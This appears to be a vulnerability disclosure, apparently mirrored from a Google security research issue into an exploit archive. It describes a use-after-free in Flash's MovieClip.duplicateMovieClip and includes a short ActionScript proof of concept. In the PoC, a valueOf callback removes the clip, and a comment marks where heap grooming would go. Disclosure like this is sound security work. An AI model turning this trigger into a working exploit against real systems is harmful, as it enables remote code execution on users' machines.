@@ -1,0 +1,30 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=591
+
+There is a use-after-free in MovieClip.duplicateMovieClip. If the depth or movie name parameter provided is an object with toString or valueOf defined, this method can free the MovieClip, which is then used. 
+
+A minimal PoC follows:
+
+
+this.createEmptyMovieClip("mc", 1);
+
+mc.duplicateMovieClip( "mc",{valueOf : func});
+
+
+function func(){
+	
+	trace("in func");
+	mc.removeMovieClip();
+
+        // Fix heap here
+
+	return 5;
+	
+	}
+	
+	
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39042.zip
+
